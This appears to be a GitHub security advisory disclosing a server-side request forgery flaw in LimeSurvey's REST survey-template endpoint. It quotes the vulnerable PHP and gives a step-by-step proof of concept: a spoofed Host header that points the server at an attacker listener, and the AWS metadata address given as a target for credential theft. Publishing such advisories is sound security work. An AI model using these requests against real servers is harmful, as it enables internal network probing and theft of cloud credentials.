# SSRF via Host Header Injection in REST API survey-template endpoint

https://github.com/LimeSurvey/LimeSurvey

### Summary

The LimeSurvey REST API endpoint `GET /index.php/rest/v1/survey-template/{id}` uses the HTTP `Host` request header directly as the target hostname when making a server-side curl request to render a survey preview. An authenticated attacker can supply an arbitrary `Host` value to make the server issue an HTTP GET request to any host and port it can reach. The full HTTP response from the target is returned verbatim in the API response, enabling network discovery and data exfiltration from internal services including cloud metadata endpoints.

### Details

The vulnerability is in `getTemplateData()` at `application/libraries/Api/Command/V1/SurveyTemplate.php`, lines 161-177:

```php
$root = (
    !empty($_SERVER['HTTPS'])
    ? 'https'
    : 'http'
) . '://' . ($_SERVER['HTTP_HOST'] ?? '');
curl_setopt(
    $ch,
    CURLOPT_URL,
    $root . "/{$surveyId}?newtest=Y&lang={$language}&popuppreview=true"
);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
```

`$_SERVER['HTTP_HOST']` reflects the incoming HTTP `Host` header without validation. The constructed URL is passed to `curl_exec()`, which makes a live HTTP request to that address. TLS certificate verification is disabled (`CURLOPT_SSL_VERIFYPEER` and `CURLOPT_SSL_VERIFYHOST` both `false`), so HTTPS services with self-signed certificates are reachable.

The endpoint is registered at `application/config/rest/v1/survey.php` under `v1/survey-template/$id` for both `GET` and `POST` methods with `'auth' => true`. The command checks `hasSurveyPermission($surveyId, 'surveycontent', 'read')` before reaching the vulnerable code. Any user who owns or has read access to at least one survey satisfies both requirements.

The function includes an in-code comment acknowledging this design flaw:

```
// @todo This shouldnt require a HTTP request we should be able to
// - render survey content internally.
```

### PoC

Tested against LimeSurvey 6.17.3 running via Docker (`martialblog/limesurvey:6-apache`).

**Step 1 -- Obtain API token (admin or any user with survey access):**

```
POST /index.php/rest/v1/auth HTTP/1.1
Host: target.example.com
Content-Type: application/json

{"username":"admin","password":"Admin1234!"}
```

Response:

```json
{"token":"SW4XKDq9OKq9thHTh_AgFHJEH1m4umGK","userId":1}
```

**Step 2 -- Start an HTTP listener on a host reachable from the LimeSurvey server:**

```bash
python3 -m http.server 9998 --bind <attacker-ip>
```

**Step 3 -- Send the survey template request with a spoofed Host header:**

```
GET /index.php/rest/v1/survey-template/12345 HTTP/1.1
Host: <attacker-ip>:9998
Authorization: Bearer SW4XKDq9OKq9thHTh_AgFHJEH1m4umGK
```

**Step 4 -- Observe results:**

Attacker listener log shows the LimeSurvey server made the outbound request:

```
172.28.0.3 - - "GET /12345?newtest=Y&lang=en&popuppreview=true HTTP/1.1" 404 -
```

The API response returns the listener's HTTP response body in the `template` field:

```json
{
    "title": "Test Survey for Security",
    "subtitle": null,
    "template": "<!DOCTYPE HTML>...<h1>Error response</h1>..."
}
```

To reach the AWS EC2 Instance Metadata Service, send `Host: 169.254.169.254`. The server will request `http://169.254.169.254/12345?...`. On instances with IMDSv1 enabled, the metadata root responds with available paths regardless of the request path.

### Impact

Any authenticated LimeSurvey user with read access to at least one survey can cause the LimeSurvey server to issue HTTP GET requests to arbitrary hosts on any TCP port. The full response is returned in the API response body. Impact includes:

- Exfiltration of responses from internal HTTP/HTTPS services not accessible from the internet (internal admin panels, databases, microservice APIs).
- Credential theft from cloud instance metadata services (AWS IMDSv1, GCP metadata, Azure IMDS).
- Internal network port and service discovery.
- Access to internal services protected only by network segmentation.

Deployments behind a reverse proxy that enforces a fixed `Host` header are not affected.

## Disclosure
 - 20 May 2026 - reported via email
 - 20 May 2026 - LimeSurvey acknowledged and gave a link I had no access to: https://bugs.limesurvey.org/view.php?id=20523
 - <img width="902" height="168" alt="image" src="https://github.com/user-attachments/assets/8bd58b61-41e3-4229-80e6-da11b4f62b5a" />
 - 17 June 2026 - followed up on updates - no responses since

<img width="1244" height="639" alt="image" src="https://github.com/user-attachments/assets/9b89edc9-8c41-438d-a1d8-76f675b2982c" />
